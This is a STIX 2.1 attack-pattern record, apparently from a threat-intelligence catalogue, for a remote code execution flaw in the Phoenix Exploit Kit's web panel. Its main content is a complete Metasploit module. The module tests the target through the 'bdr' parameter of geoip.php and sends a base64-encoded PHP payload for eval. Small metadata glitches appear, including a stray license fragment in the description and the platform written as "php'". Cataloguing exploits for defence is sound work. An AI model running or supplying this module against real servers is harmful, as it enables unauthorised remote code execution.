{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--55060a4e-b2a2-4669-a4cf-2f35d12d3a50",
    "created": "2024-08-14T17:09:50.614105Z",
    "modified": "2024-08-14T17:09:50.61411Z",
    "name": "Phoenix Exploit Kit Remote Code Execution",
    "description": " This module exploits a Remote Code Execution in the web panel of Phoenix Exploit Kit via geoip.php. The Phoenix Exploit Kit is a popular commercial crimeware tool that probes the browser of the visitor for the presence of outdated and insecure versions of browser plugins like Java and Adobe Flash and Reader silently installing malware if found.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/phoenix_exec.rb",
            "external_id": "phoenix_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.pwnmalw.re/Exploit%20Pack/phoenix"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Phoenix Exploit Kit Remote Code Execution',\n      'Description'    => %q{\n        This module exploits a Remote Code Execution in the web panel of Phoenix Exploit Kit via geoip.php. The\n        Phoenix Exploit Kit is a popular commercial crimeware tool that probes the browser of the visitor for the\n        presence of outdated and insecure versions of browser plugins like Java and Adobe Flash and Reader,\n        silently installing malware if found.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'CrashBandicot', #initial discovery by @DosPerl\n          'Jay Turla' #msf module by @shipcod3\n        ],\n      'References'     =>\n        [\n          [ 'EDB', '40047' ],\n          [ 'URL', 'http://krebsonsecurity.com/tag/phoenix-exploit-kit/' ], # description of Phoenix Exploit Kit\n          [ 'URL', 'https://www.pwnmalw.re/Exploit%20Pack/phoenix' ]\n        ],\n      'Privileged'     => false,\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ]\n        ],\n      'DisclosureDate' => '2016-07-01',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path of geoip.php which is vulnerable to RCE', '/Phoenix/includes/geoip.php'])\n      ])\n  end\n\n  def check\n    test = Rex::Text.rand_text_alpha(8)\n    res = http_send_command(\"echo \\\"#{test}\\\";\")\n    if res && res.body.include?(test)\n      return Exploit::CheckCode::Vulnerable\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    encoded = Rex::Text.encode_base64(payload.encoded)\n    http_send_command(\"eval(base64_decode(\\\"#{encoded}\\\"));\")\n  end\n\n  def http_send_command(cmd)\n    send_request_cgi(\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path),\n      'vars_get' => {\n        'bdr' => cmd\n      }\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-07-01",
    "x_mitre_platforms": [
        "php'"
    ]
}